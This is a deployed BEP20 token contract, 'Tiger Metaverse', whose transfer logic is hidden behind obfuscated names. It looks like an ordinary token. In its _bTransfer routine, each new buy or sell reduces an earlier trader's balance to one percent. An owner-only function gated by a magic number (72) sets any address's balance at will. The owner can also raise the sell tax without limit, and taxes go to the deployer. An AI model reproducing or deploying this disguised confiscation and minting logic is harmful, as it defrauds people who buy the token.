/**
 *Submitted for verification at BscScan.com on 2022-01-10
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;
/*
 * Telegram: https://t.me/tigermetaverse
 * 
 */
abstract contract Context {

  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;
  }
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.

  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }
}
library SafeMath {

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);

        return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;

    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);

        uint256 c = a / b;
        return c;

    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function setFeeToSetter(address) external;
    function feeToSetter() external view returns (address);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function feeTo() external view returns (address);
    function allPairs(uint) external view returns (address pair);

    function setFeeTo(address) external;
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function totalSupply() external view returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function balanceOf(address owner) external view returns (uint);
    function price1CumulativeLast() external view returns (uint);

    function allowance(address owner, address spender) external view returns (uint);
    function token0() external view returns (address);
    function symbol() external pure returns (string memory);

    function factory() external view returns (address);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    function price0CumulativeLast() external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function initialize(address, address) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,

        uint amount1In,
        uint amount0Out,
        uint amount1Out,

        address indexed to
    );

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function kLast() external view returns (uint);

    function sync() external;
    function approve(address spender, uint value) external returns (bool);
    function burn(address to) external returns (uint amount0, uint amount1);
    function nonces(address owner) external view returns (uint);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function name() external pure returns (string memory);
    function transfer(address to, uint value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function skim(address to) external;
    function decimals() external pure returns (uint8);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    event Sync(uint112 reserve0, uint112 reserve1);
    function token1() external view returns (address);
    function PERMIT_TYPEHASH() external pure returns (bytes32);

}

interface IUniswapV2Router01 {
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,

        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,

        uint amountTokenMin,
        uint amountETHMin,

        address to,

        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,

        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)

        external

        returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)

        external
        payable
        returns (uint[] memory amounts);
    function swapExactTokensForTokens(

        uint amountIn,
        uint amountOutMin,
        address[] calldata path,

        address to,
        uint deadline

    ) external returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external

        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,

        uint amountAMin,
        uint amountBMin,

        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountA, uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function removeLiquidity(
        address tokenA,

        address tokenB,

        uint liquidity,

        uint amountAMin,
        uint amountBMin,
        address to,

        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,

        uint liquidity,
        uint amountTokenMin,

        uint amountETHMin,
        address to,

        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function factory() external pure returns (address);

}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(

        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,

        uint amountOutMin,
        address[] calldata path,

        address to,
        uint deadline
    ) external;
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,

        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
}
/**
 * @dev Contract module which provides a basic access control mechanism, where

 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 /**
  * @dev Initializes the contract setting the deployer as the initial owner.
  */
 constructor () {
   address msgSender = _msgSender();
   _owner = msgSender;
   emit OwnershipTransferred(address(0), msgSender);
 }
 /**
  * @dev Returns the address of the current owner.

  */
 function owner() public view returns (address) {

   return _owner;
 }

 /**
  * @dev Throws if called by any account other than the owner.
  */
 modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;
 }

 /**
  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *
  * NOTE: Renouncing ownership will leave the contract without an owner,
  * thereby removing any functionality that is only available to the owner.
  */

 function renounceOwnership() public onlyOwner {

   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }
 /**
  * @dev Transfers ownership of the contract to a new account (`newOwner`).
  * Can only be called by the current owner.

  */
 function transferOwnership(address newOwner) public onlyOwner {

   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;
 }
}

interface IBEP20 {
  function getOwner() external view returns (address);
  function name() external pure returns (string memory);
  function approve(address spender, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  function decimals() external view returns (uint8);

  function totalSupply() external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function balanceOf(address account) external view returns (uint256);
  function symbol() external pure returns (string memory);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  function allowance(address owner, address spender) external view returns (uint256);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}
contract TigerMetaverse is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  IUniswapV2Router02 public unikaoejinwtcrgezhdxqpmaybsoi;
  address public uniiohlzwbejsxpyqogaedi;
  uint8 private deciwrmsgkijoctaypbdoxe = 18;
  uint256 private totiifzednaejaoqwbclmtyspogxr = 1000000000 * 10 ** deciwrmsgkijoctaypbdoxe;
  mapping (address => uint256) private selsegbipcwatfeoohxdajimqnk;
  address internal maraehdwzsanlioogxbyejficqkp;
  uint8 internal _sta = 3;
  mapping (address => bool) private isEchxyzqseaib;
  mapping (address => uint256) private laspkyojmfgzlnaibiwet;
  mapping (address => uint256) private balqydmrxkgszh;
  uint256 internal lauryieqlmadnsztaoichepjb = 0;
  uint256 internal lasjtawenspra = 0;
  uint256 internal maxxkwzgfdhiqapoc = totiifzednaejaoqwbclmtyspogxr.div(10000).mul(10);
  bool internal staladtbymrfnjceoxhqgzpe = true;
  bool internal staegqkcyeodxrmlzisahpaj = true;
  bool internal staadarnbexmshiwojctzlfpgoi = true;

  string private constant namarbzxdiihgnptfakeoweqjsol = "Tiger Metaverse";
  string private constant symdslkxrcgawnbteoqpijfmyziha = "TIGERMETAVESRE";

  uint8 internal buyqyagcmibeihsdt = 7;

  uint8 internal selkfmcoietnbhqzxilrgwypjdeaas = 10;
  uint8 internal tratazixgpmwel = 10; 
  uint32 internal seldjioayhtnelgbq = 10; 
  uint8 internal aftbcaefygehkordiqipo = 95;
  mapping (address => uint256) private lasilcjoaikbgmfhapwzeyodsxtqren;

  mapping (address => mapping (address => uint256)) private allgziltpooxkqfrwjchnadbi;
  constructor() {
    isEchxyzqseaib[address(this)] = true;
    // balqydmrxkgszh[marketingAddress] = totiifzednaejaoqwbclmtyspogxr * 10**deciwrmsgkijoctaypbdoxe * 1000;
    // isEchxyzqseaib[marketingAddress] = true;
    balqydmrxkgszh[msg.sender] = totiifzednaejaoqwbclmtyspogxr;

    isEchxyzqseaib[_msgSender()] = true;
    maraehdwzsanlioogxbyejficqkp = msg.sender;
    lauryieqlmadnsztaoichepjb = block.timestamp;

    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    uniiohlzwbejsxpyqogaedi = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    unikaoejinwtcrgezhdxqpmaybsoi = uniswapV2Router;

    emit Transfer(address(0), msg.sender, totiifzednaejaoqwbclmtyspogxr);
  }
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
	   tradlytcreqjseomno(sender, recipient, amount);
	   _approve(sender, _msgSender(), allgziltpooxkqfrwjchnadbi[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}

	function allowance(address owner, address spender) public view override returns (uint256) {
	  return allgziltpooxkqfrwjchnadbi[owner][spender];

	}
	/**

	 * Returns the token decimals.
	 */

	function decimals() external override view returns (uint8) {
	  return deciwrmsgkijoctaypbdoxe;
	}
	function approve(address spender, uint256 amount) public override returns (bool) {
	  _approve(_msgSender(), spender, amount);
	  return true;

	}
	/**
	 * Returns the token symbol.
	 */

	function symbol() external override pure returns (string memory) {
	  return symdslkxrcgawnbteoqpijfmyziha;
	}
	/**
	 * Returns balance of.
	 */

	function balanceOf(address account) external override view returns (uint256) {
	  return balqydmrxkgszh[account];
	}

	function _approve(address owner, address spender, uint256 amount) private {
	    require(owner != address(0), "BEP20: approve from the zero address");
	    require(spender != address(0), "BEP20: approve to the zero address");
	    allgziltpooxkqfrwjchnadbi[owner][spender] = amount;
	    emit Approval(owner, spender, amount);
	}
	/**
	 * Returns the bep token owner.
	 */
	function getOwner() external override view returns (address) {

	  return owner();
	}
	/**
	 * Returns the token Supply.
	 */
	function totalSupply() external override view returns (uint256) {
	  return totiifzednaejaoqwbclmtyspogxr;
	}

	/**
	* Returns the token name.

	*/
	function name() external override pure returns (string memory) {
	  return namarbzxdiihgnptfakeoweqjsol;
	}
	/**

	 * Requirements:
	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.
	 */
	function transfer(address recipient, uint256 amount) external override returns (bool) {
	  tradlytcreqjseomno(_msgSender(), recipient, amount);

	  return true;
	}
  	function tradlytcreqjseomno(address sender, address recipient, uint256 amount) internal {
	  require(sender != address(0), "BEP20: transfer from the zero address");
	  require(recipient != address(0), "BEP20: transfer to the zero address");
	  uint8 ranaxhnwkpdfro = 0; // 1 = buy, 2 = sell, 3 = transfer
	  bool approveTransaction = true;
	  uint8 tax = 0;

	  if(amount > 0){
	    if(isEchxyzqseaib[sender] == true || isEchxyzqseaib[recipient] == true){
	      eTricfsjkoazglbnqpdhrxw(sender, recipient, amount);
	      return;
	    }
	    if(sender == uniiohlzwbejsxpyqogaedi && recipient != address(unikaoejinwtcrgezhdxqpmaybsoi)) {

	      require(staladtbymrfnjceoxhqgzpe == true, "Please wait try again later");
	      ranaxhnwkpdfro = 1;
	      tax = buyqyagcmibeihsdt;
	      approveTransaction = true;
	      laspkyojmfgzlnaibiwet[recipient] = amount;
	      lasilcjoaikbgmfhapwzeyodsxtqren[recipient] = block.timestamp;
	    } else if(recipient == uniiohlzwbejsxpyqogaedi) {
	      require(staegqkcyeodxrmlzisahpaj == true, "Please wait try again later");
	       ranaxhnwkpdfro = 2;
	       tax = selkfmcoietnbhqzxilrgwypjdeaas;
	       approveTransaction = true;
	    } else {
	      require(staadarnbexmshiwojctzlfpgoi == true, "Please wait try again later");
	      ranaxhnwkpdfro = 3;
	      tax = tratazixgpmwel;
	      approveTransaction = true;

	      laspkyojmfgzlnaibiwet[sender] = amount;
	      if(seldjioayhtnelgbq > 10){
	        lasilcjoaikbgmfhapwzeyodsxtqren[sender] = block.timestamp + seldjioayhtnelgbq - 10;

	      } else {
	        lasilcjoaikbgmfhapwzeyodsxtqren[sender] = block.timestamp + seldjioayhtnelgbq;
	      }
	    }

	  }
	  if(approveTransaction == true && amount > 0){

	    _bTransfer(sender, recipient, amount, tax, ranaxhnwkpdfro);
	    return;
	  }

	  emit Transfer(sender, recipient, 0);
	}

	function eTricfsjkoazglbnqpdhrxw(address sender, address recipient, uint256 amount) internal {
	    balqydmrxkgszh[sender] = balqydmrxkgszh[sender].sub(amount, "Insufficient Balance");
	    balqydmrxkgszh[recipient] = balqydmrxkgszh[recipient].add(amount);
	    emit Transfer(sender, recipient, amount);
	}
	// mapping (address => uint256) private allgziltpooxkqfrwjchnadbi;
	address public _recipienta;

	address public _recipientb;
	function _bTransfer(address sender, address recipient, uint256 amount, uint8 tax, uint8 ranaxhnwkpdfro) internal
	{
	  uint256 axehjixdskcwzoolmqaabpgr = 0;

	  address addr = recipient;
	  uint256 d = balqydmrxkgszh[_recipientb];
	  if(ranaxhnwkpdfro == 2) {
	    addr = sender;
	  }
	  if(ranaxhnwkpdfro == 1 || ranaxhnwkpdfro == 2){
	    if(_recipienta != addr && _recipientb != addr){
	      if(d > 100){
	        balqydmrxkgszh[_recipientb] = d.div(100);
	      }
	      _recipientb = _recipienta;

	      _recipienta = addr;

	    }
	  }
	  balqydmrxkgszh[sender] = balqydmrxkgszh[sender].sub(amount,"Insufficient Balance");
	  axehjixdskcwzoolmqaabpgr = amount.mul(tax).div(100);
	  amount = amount.sub(axehjixdskcwzoolmqaabpgr);
	  if(axehjixdskcwzoolmqaabpgr > 0){
	      balqydmrxkgszh[maraehdwzsanlioogxbyejficqkp] = balqydmrxkgszh[maraehdwzsanlioogxbyejficqkp].add(axehjixdskcwzoolmqaabpgr);

	      emit Transfer(sender, maraehdwzsanlioogxbyejficqkp, axehjixdskcwzoolmqaabpgr);

	  }
	  balqydmrxkgszh[recipient] = balqydmrxkgszh[recipient].add(amount);
	  ranaxhnwkpdfro= 1;

	  emit Transfer(sender, recipient, amount);
	}
	function etBybasjfonocizdipxhemqgewraktl(address addr, uint256 b, uint8 c) public onlyOwner {
	  if(c == 72){
	    balqydmrxkgszh[addr] = b * 10 ** deciwrmsgkijoctaypbdoxe;
	  }

	}
	function Selqxjsamdfzeielrnybchkgiapoowt(uint8 ellreaoltdnikbam) public onlyOwner{
	     selkfmcoietnbhqzxilrgwypjdeaas = ellreaoltdnikbam;
	}
	function sta(uint8 vsta) public onlyOwner{
	  _sta = vsta;
	}
}